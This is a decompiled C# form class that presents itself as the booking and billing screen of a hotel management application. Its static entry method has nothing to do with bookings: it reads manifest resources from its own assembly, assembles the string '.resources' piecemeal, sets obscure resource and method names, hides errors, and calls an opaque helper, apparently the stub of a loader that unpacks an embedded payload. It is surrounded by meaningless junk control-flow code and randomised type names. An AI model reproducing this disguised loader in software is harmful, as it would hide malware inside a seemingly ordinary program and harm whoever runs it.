using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Fe1c5K;
using Fs70Aq;
using Fs7t1A;
using Kk26Rg;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Se1g8G;
using Td2a7F;
using Xg95Wb;
using Yp62Ao;
using Yy7d9N;
using g4PDc8;
using k6H9Dg;
using o4JDp5;
using p8BNw1;
using r1LBq4;

namespace n5FRd0;

public class j4WGd7
{
	public object SQL;

	public int GuestID;

	public DateTime CheckIn;

	public DateTime CheckOut;

	public int RoomNum;

	private Point Pos;

	private object DescPricelbl;

	private object DescRoomlbl;

	public object Payment
	{
		[CompilerGenerated]
		get
		{
			return _Payment;
		}
		[CompilerGenerated]
		set
		{
			_Payment = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public Point Location { get; set; }

	public object IDlbl
	{
		[CompilerGenerated]
		get
		{
			return _IDlbl;
		}
		[CompilerGenerated]
		set
		{
			_IDlbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Totallbl
	{
		[CompilerGenerated]
		get
		{
			return _Totallbl;
		}
		[CompilerGenerated]
		set
		{
			_Totallbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object DescDaylbl
	{
		[CompilerGenerated]
		get
		{
			return _DescDaylbl;
		}
		[CompilerGenerated]
		set
		{
			_DescDaylbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Depositlbl
	{
		[CompilerGenerated]
		get
		{
			return _Depositlbl;
		}
		[CompilerGenerated]
		set
		{
			_Depositlbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object RoomTypelbl
	{
		[CompilerGenerated]
		get
		{
			return _RoomTypelbl;
		}
		[CompilerGenerated]
		set
		{
			_RoomTypelbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object RoomNumlbl
	{
		[CompilerGenerated]
		get
		{
			return _RoomNumlbl;
		}
		[CompilerGenerated]
		set
		{
			_RoomNumlbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Checkoutlbl
	{
		[CompilerGenerated]
		get
		{
			return _Checkoutlbl;
		}
		[CompilerGenerated]
		set
		{
			_Checkoutlbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Checkinlbl
	{
		[CompilerGenerated]
		get
		{
			return _Checkinlbl;
		}
		[CompilerGenerated]
		set
		{
			_Checkinlbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object BookDatelbl
	{
		[CompilerGenerated]
		get
		{
			return _BookDatelbl;
		}
		[CompilerGenerated]
		set
		{
			_BookDatelbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object Namelbl
	{
		[CompilerGenerated]
		get
		{
			return _Namelbl;
		}
		[CompilerGenerated]
		set
		{
			_Namelbl = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public j4WGd7()
	{
		SQL = RuntimeHelpers.GetObjectValue(new object());
	}

	private void g9DRs4(object sender, EventArgs e)
	{
		NewLateBinding.LateSetComplex(IDlbl, (Type)null, "Text", new object[1] { GuestID }, (string[])null, (Type[])null, false, true);
		object sQL = SQL;
		object[] obj = new object[2] { "@id", null };
		ref int guestID = ref GuestID;
		obj[1] = guestID;
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(sQL, (Type)null, "AddParam", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			guestID = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "Select * FROM GuestTable WHERE Guest_ID = @id;" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(Namelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(BookDatelbl, (Type)null, "Text", new object[1] { DateTime.Now }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Checkinlbl, (Type)null, "Text", new object[1] { CheckIn.ToString() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Checkoutlbl, (Type)null, "Text", new object[1] { CheckOut.ToString() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(RoomNumlbl, (Type)null, "Text", new object[1] { RoomNum }, (string[])null, (Type[])null, false, true);
		object roomNumlbl;
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2]
		{
			"@roomnum",
			NewLateBinding.LateGet(roomNumlbl = RoomNumlbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)
		}, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			NewLateBinding.LateSetComplex(roomNumlbl, (Type)null, "Text", new object[1] { array[1] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "Select * FROM RoomTable WHERE Room_Number = @roomnum;" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(RoomTypelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSet(DescRoomlbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(RoomTypelbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null) }, (string[])null, (Type[])null);
		int num = checked((int)DateAndTime.DateDiff((DateInterval)4, CheckIn.Date, CheckOut.Date, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
		NewLateBinding.LateSetComplex(DescDaylbl, (Type)null, "Text", new object[1] { num }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSet(DescPricelbl, (Type)null, "Text", new object[1] { NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(SQL, (Type)null, "DBDT", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Rows", new object[1] { 0 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Item", new object[1] { 4 }, (string[])null, (Type[])null, (bool[])null).ToString() }, (string[])null, (Type[])null);
		NewLateBinding.LateSetComplex(Totallbl, (Type)null, "Text", new object[1] { Operators.MultiplyObject(NewLateBinding.LateGet(DescDaylbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), NewLateBinding.LateGet(DescPricelbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Depositlbl, (Type)null, "Text", new object[1] { Operators.MultiplyObject(Operators.MultiplyObject(NewLateBinding.LateGet(DescPricelbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0.2), NewLateBinding.LateGet(DescDaylbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null, false, true);
	}

	private void Sk39Qw(object sender, EventArgs e)
	{
		DateTime now = DateTime.Now;
		string text = "Active";
		decimal.TryParse(Conversions.ToString(NewLateBinding.LateGet(Totallbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), out var result);
		object sQL = SQL;
		object iDlbl;
		object[] obj = new object[2]
		{
			"@guestid",
			NewLateBinding.LateGet(iDlbl = IDlbl, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)
		};
		object[] array = obj;
		bool[] obj2 = new bool[2] { false, true };
		bool[] array2 = obj2;
		NewLateBinding.LateCall(sQL, (Type)null, "AddParam", obj, (string[])null, (Type[])null, obj2, true);
		if (array2[1])
		{
			NewLateBinding.LateSetComplex(iDlbl, (Type)null, "Text", new object[1] { array[1] }, (string[])null, (Type[])null, true, true);
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "@billdate", now }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			now = (DateTime)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(DateTime));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "@paystatus", text }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "@total", result }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			result = (decimal)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(decimal));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", array = new object[2] { "@balance", result }, (string[])null, (Type[])null, array2 = new bool[2] { false, true }, true);
		if (array2[1])
		{
			result = (decimal)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(decimal));
		}
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", new object[2] { "@tax", 0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(SQL, (Type)null, "AddParam", new object[2] { "@bookingid", 0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(SQL, (Type)null, "ExecQuery", new object[1] { "INSERT INTO BillingTable (Guest_ID, Billing_Date, Payment_Status, Total_Amount, Balance_Amount, Tax_Amount, Booking_ID)VALUES (@guestid, @billdate, @paystatus, @total, @balance, @tax, @bookingid);" }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateSetComplex(Payment, (Type)null, "Deposit", new object[1] { 1 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(Payment, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		o0ZCj2();
	}

	private void o0ZCj2()
	{
		throw new NotImplementedException();
	}

	private void Fr3d5M(object sender, EventArgs e)
	{
		r3P8Zz();
	}

	private void r3P8Zz()
	{
		throw new NotImplementedException();
	}

	private void x3P4Xj(object sender, MouseEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			Location += (Size)(Control.get_MousePosition() - (Size)Pos);
		}
		Pos = Control.get_MousePosition();
	}

	[STAThread]
	public static void j2M5Bg()
	{
		try
		{
			DateTime t = DateTime.Now.ToLocalTime();
			if (DateTime.Compare(Conversions.ToDate(DateTime.Now.AddHours(6.0).ToLongTimeString()), t) == 0)
			{
				return;
			}
			string currentDirectory = Directory.GetCurrentDirectory();
			string directoryName = Path.GetDirectoryName(currentDirectory);
			object obj2;
			int num4;
			checked
			{
				int num = default(int);
				if (currentDirectory.Contains(directoryName))
				{
					string text = directoryName;
					foreach (char c in text)
					{
						if (Operators.CompareString(Conversions.ToString(c), "\\", false) == 0)
						{
							num++;
						}
					}
				}
				if (num <= 0)
				{
					return;
				}
				List<char[]> list = new List<char[]>();
				list.Add(currentDirectory.ToArray());
				list.Add(directoryName.ToArray());
				StringBuilder stringBuilder = new StringBuilder();
				StringBuilder stringBuilder2 = new StringBuilder();
				long num2 = currentDirectory.Length * num;
				char[] array = list[0];
				foreach (char value in array)
				{
					stringBuilder.Append(value);
					num2 += num;
				}
				char[] array2 = list[1];
				foreach (char value2 in array2)
				{
					stringBuilder2.Append(value2);
					num2 += num;
				}
				object obj = num * 3;
				Operators.AddObject(obj, (object)1);
				int num3;
				do
				{
					c6C3Fx.num = Da3r8C.Gj7k3J();
					num3 = c6C3Fx.num;
				}
				while (num3 != 100);
				c6C3Fx.Ass = Assembly.GetExecutingAssembly();
				c6C3Fx.Names = ((Assembly)c6C3Fx.Ass).GetManifestResourceNames();
				c6C3Fx.ResName = "vbvbbv";
				c6C3Fx.Res = string.Format("{0}{1}{2}{3}{4}", ".r", "es", "ou", "rc", "es");
				c6C3Fx.MName = "qqazsggfgfdddggddgsdw";
				c6C3Fx.TNum = 35;
				c6C3Fx.Mnum = 0;
				obj2 = new object[16];
				num4 = 0;
			}
			do
			{
				NewLateBinding.LateIndexSet(obj2, new object[2]
				{
					num4,
					c6C3Fx.num % checked(num4 + 2)
				}, (string[])null);
				num4 = checked(num4 + 1);
			}
			while (num4 <= 10);
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(obj2, new object[1] { 5 }, (string[])null), (object)2, false))
			{
				Ay2j5L.Pg19At(null, 125, "gddgewwww", Tm9c6M: false);
				if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectLessEqual(NewLateBinding.LateIndexGet(obj2, new object[1] { 5 }, (string[])null), (object)0, false))))
				{
					NewLateBinding.LateIndexSet(obj2, new object[2]
					{
						5,
						Operators.MultiplyObject(Operators.MultiplyObject(NewLateBinding.LateIndexGet(obj2, new object[1] { 5 }, (string[])null), (object)25), (object)25)
					}, (string[])null);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void k0HZe3()
	{
		_ = (j4WGd7)((i5E4Bo)((Sr42Xw)((j4WGd7)null).RoomNumlbl).Form1).Login;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out n5T8Lx n5T8Lx);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out c6C3Fx c6C3Fx);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Ay2j5L ay2j5L);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out n5G7Ly n5G7Ly);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out y5T3Gr y5T3Gr);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out w1DQe5 w1DQe);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nuint num);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out j4WGd7 j4WGd8);
		try
		{
			num = num;
			if (num == 0)
			{
				try
				{
					_ = (t2H6Tc)(object)n5G7Ly.Default;
				}
				finally
				{
					n5G7Ly = n5G7Ly;
					n5G7Ly = n5G7Ly;
					n5T8Lx = n5T8Lx;
					n5T8Lx = n5T8Lx;
					w1DQe = w1DQe;
					w1DQe = null;
					y5T3Gr = y5T3Gr;
					y5T3Gr = y5T3Gr;
					goto end_IL_0020;
				}
			}
			end_IL_0020:;
		}
		catch
		{
			do
			{
				if ((UIntPtr)w1DQe.Form1 != (UIntPtr)(nuint)0u)
				{
					j4WGd8 = null;
					_ = (e0G7Qb)j4WGd8.Checkinlbl;
					_ = (t2H6Tc)((i5E4Bo)null).Totallbl;
					c6C3Fx = null;
				}
				else
				{
					_ = (_003CModule_003E)ay2j5L.Form1;
				}
			}
			while (obj != null);
		}
		e0G7Qb e0G7Qb = e0G7Qb;
		_ = (j4WGd7)e0G7Qb.Form1;
		i5E4Bo i5E4Bo = null;
		_ = (_003CModule_003E)i5E4Bo.Payment;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Da3r8C da3r8C);
		_ = (n5G7Ly)da3r8C.PanelDesktop;
		n5G7Ly = null;
		try
		{
			while (obj != null)
			{
				_ = (Ay2j5L)(object)n5G7Ly.Default;
			}
		}
		catch
		{
			c6C3Fx = null;
		}
		if (num == 0)
		{
			_ = (n5G7Ly)((Sr42Xw)null).Totallbl;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CModule_003E _003CModule_003E);
		try
		{
			try
			{
				_003CModule_003E = _003CModule_003E;
				_003CModule_003E = _003CModule_003E;
			}
			finally
			{
				ay2j5L = (Ay2j5L)ay2j5L.Form1;
				goto end_IL_013d;
			}
			end_IL_013d:;
		}
		finally
		{
			_ = (i5E4Bo)((w1DQe5)null).IDlbl;
			goto IL_0174;
		}
		IL_03f2:
		_ = (n5T8Lx)(object)n5G7Ly.Default;
		_ = (n5T8Lx)((c6C3Fx)i5E4Bo.Totallbl).Totallbl;
		_ = (Da3r8C)c6C3Fx.Form1;
		while (obj != null)
		{
			_ = (j4WGd7)((Ay2j5L)null).Form1;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Wn13Sb wn13Sb);
		while (obj != null)
		{
			try
			{
				num = default(UIntPtr);
				if (num == 0)
				{
					_ = c6C3Fx.Location is n5T8Lx;
					continue;
				}
				ay2j5L = ay2j5L;
				_003CModule_003E = _003CModule_003E;
				wn13Sb = wn13Sb;
				wn13Sb = wn13Sb;
			}
			catch
			{
				try
				{
					ay2j5L = (Ay2j5L)((Da3r8C)null).IconCurrentForm;
				}
				catch
				{
					_ = (Da3r8C)((n5T8Lx)null).Payment;
				}
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Sr42Xw sr42Xw);
		do
		{
			if (num != 0)
			{
				try
				{
					n5T8Lx = n5T8Lx;
				}
				finally
				{
					_ = (_003CModule_003E)e0G7Qb.Totallbl;
					continue;
				}
			}
			num = default(UIntPtr);
			if (num / num == 0)
			{
				_ = (Wn13Sb)sr42Xw.IDlbl;
			}
		}
		while (obj != null);
		if ((UIntPtr)c6C3Fx.Form1 == (UIntPtr)(nuint)0u)
		{
			j4WGd8 = j4WGd8;
		}
		else if (num == 0)
		{
			ay2j5L = ay2j5L;
		}
		num = default(UIntPtr);
		if (num / num == 0)
		{
			if (default(UIntPtr) == (UIntPtr)(nuint)0u)
			{
				try
				{
					_ = (i5E4Bo)(object)n5G7Ly.Default;
				}
				finally
				{
					_ = (_003CModule_003E)ay2j5L.Totallbl;
					goto IL_0574;
				}
			}
			do
			{
				_ = (n5G7Ly)c6C3Fx.Form1;
			}
			while (obj != null);
		}
		goto IL_0574;
		IL_0174:
		w1DQe = w1DQe;
		_ = (w8QFz9)((Da3r8C)((w1DQe5)null).Form1).Login;
		_ = (t2H6Tc)j4WGd8.RoomNumlbl;
		if (num == 0)
		{
			do
			{
				y5T3Gr = y5T3Gr;
			}
			while (obj != null);
		}
		while (obj != null)
		{
		}
		da3r8C = (Da3r8C)e0G7Qb.Form1;
		if (checked(num + num) == 0)
		{
			e0G7Qb = null;
		}
		num = default(UIntPtr);
		if (num == (UIntPtr)(nuint)0u)
		{
			while (obj != null)
			{
				da3r8C = da3r8C;
			}
		}
		_ = (n5T8Lx)e0G7Qb.Login;
		if ((UIntPtr)((Da3r8C)null).PanelDesktop == (UIntPtr)(nuint)0u)
		{
			if (num == (UIntPtr)(nuint)0u)
			{
				_ = (t2H6Tc)(object)n5G7Ly.Default;
			}
		}
		else
		{
			while (obj != null)
			{
				_ = (Wn13Sb)(object)n5G7Ly.Default;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out w8QFz9 w8QFz);
		while (obj != null)
		{
			try
			{
				if ((nuint)(UIntPtr)n5G7Ly.Default / (nuint)(UIntPtr)((j4WGd7)null).Depositlbl == 0)
				{
					_ = (w8QFz9)i5E4Bo.Form1;
					_ = (n5G7Ly)i5E4Bo.Totallbl;
				}
			}
			catch
			{
				do
				{
					w8QFz9 obj6 = (w8QFz9)i5E4Bo.Form1;
					w8QFz = w8QFz;
					w8QFz = obj6;
				}
				while (obj != null);
			}
		}
		checked
		{
			if (unchecked((nuint)default(UIntPtr)) + unchecked((nuint)default(UIntPtr)) == 0)
			{
				while (obj != null)
				{
					if (unchecked((nuint)(UIntPtr)j4WGd8.Namelbl) + unchecked((nuint)(UIntPtr)da3r8C.IconCurrentForm) == 0)
					{
						y5T3Gr = y5T3Gr;
						_ = (Da3r8C)e0G7Qb.IDlbl;
						_ = (w1DQe5)((Sr42Xw)j4WGd8.RoomTypelbl).Totallbl;
						sr42Xw = sr42Xw;
						_ = (t2H6Tc)sr42Xw.Login;
					}
					else
					{
						sr42Xw = sr42Xw;
					}
				}
			}
			try
			{
				try
				{
					while (obj != null)
					{
						da3r8C = da3r8C;
					}
				}
				finally
				{
					try
					{
						_ = (Da3r8C)((Ay2j5L)((c6C3Fx)null).IDlbl).Totallbl;
					}
					finally
					{
						y5T3Gr = (y5T3Gr)((n5T8Lx)((i5E4Bo)null).Payment).Login;
						_ = (Sr42Xw)((Ay2j5L)null).Payment;
						w1DQe = null;
						goto end_IL_033c;
					}
				}
				end_IL_033c:;
			}
			finally
			{
				num = default(UIntPtr);
				if (num == 0)
				{
					do
					{
						_ = (e0G7Qb)((Sr42Xw)(object)n5G7Ly.Default).Form1;
						_ = (e0G7Qb)ay2j5L.Payment;
					}
					while (j4WGd8.Checkinlbl != null);
				}
				else
				{
					do
					{
						_ = (Ay2j5L)(object)n5G7Ly.Default;
					}
					while (obj != null);
				}
				goto IL_03f2;
			}
		}
		IL_0574:
		try
		{
			sr42Xw = sr42Xw;
		}
		catch
		{
			while (obj != null)
			{
				do
				{
					_ = (w8QFz9)e0G7Qb.Payment;
				}
				while (obj != null);
			}
		}
		while (true)
		{
			if (obj != null)
			{
				_ = (y5T3Gr)((Sr42Xw)null).Payment;
				_ = (w8QFz9)e0G7Qb.Payment;
				da3r8C = da3r8C;
				_ = (w8QFz9)((Ay2j5L)n5T8Lx.Totallbl).Payment;
			}
			else if (obj == null)
			{
				break;
			}
		}
		num = default(UIntPtr);
		if (checked((num - num) * num) == 0)
		{
			do
			{
				try
				{
					_ = (z4R2An)n5T8Lx.Totallbl;
				}
				finally
				{
					c6C3Fx = c6C3Fx;
					continue;
				}
			}
			while (i5E4Bo.IDlbl != null);
		}
		while (obj != null)
		{
			do
			{
				_ = (w1DQe5)((n5T8Lx)((Ay2j5L)null).Form1).IDlbl;
			}
			while (obj != null);
		}
		try
		{
			do
			{
				_ = (y5T3Gr)((c6C3Fx)(object)n5G7Ly.Default).Form1;
			}
			while (obj != null);
		}
		catch
		{
			_ = (y5T3Gr)((n5T8Lx)sr42Xw.Form1).Login;
		}
		finally
		{
			try
			{
				try
				{
					_ = (c6C3Fx)((Sr42Xw)(((Da3r8C)null).Location as Ay2j5L).Login).Payment;
					return;
				}
				catch
				{
					j4WGd8 = (j4WGd7)((i5E4Bo)null).Payment;
					return;
				}
			}
			catch
			{
				return;
			}
		}
	}
}
